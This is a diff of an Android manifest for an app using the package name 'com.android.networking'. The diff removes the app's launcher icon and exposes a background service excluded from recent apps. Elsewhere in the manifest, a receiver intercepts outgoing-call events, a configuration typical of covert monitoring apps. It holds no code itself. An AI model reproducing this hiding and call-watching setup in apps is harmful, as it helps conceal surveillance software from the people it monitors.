@@ -31,31 +31,23 @@
 	<uses-permission android:name="android.permission.WAKE_LOCK" />
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-
+	
 	<uses-sdk android:minSdkVersion="8"  android:targetSdkVersion="10" />
 	
-	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="false" android:allowBackup="false">
-	
-		<activity android:name="com.android.networking.gui.AGUI"
-			android:label="@string/app_name" android:excludeFromRecents="true"
-			android:enabled="true">
+	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="false" android:allowBackup="false" >
+		<service android:name="com.android.networking.ServiceMain" android:exported="true"
+			android:excludeFromRecents="true">
 			<intent-filter>
-				<action android:name="android.intent.action.MAIN" />
-				<category android:name="android.intent.category.LAUNCHER" />
+				<action android:name="com.android.networking.app"/>		
+				<!-- only RELEASE -->
+				<action android:name="android.intent.action.MAIN"/>
 			</intent-filter>
-		</activity>
+		</service>
 		
 		<activity android:name="com.android.networking.gui.CGui"
 			android:label="cgui" android:excludeFromRecents="true"
 			android:enabled="true" android:theme="@style/Theme.Tr6871623">
 		</activity>
-
-		<service android:name="com.android.networking.ServiceMain" android:exported="false"
-			android:excludeFromRecents="true">
-			<intent-filter>
-				<action android:name="com.android.networking.app"/>		
-			</intent-filter>
-		</service>
 
 		<receiver android:name="com.android.networking.BM">
 			<intent-filter>
@@ -68,7 +60,8 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
 		</receiver>
-
+		
+	
 		<receiver android:name="com.android.networking.listener.BAc">
 		</receiver>
 
@@ -91,5 +84,6 @@
 		</receiver>
 	</application>
 
+	<uses-sdk android:minSdkVersion="8" />
 
 </manifest> 
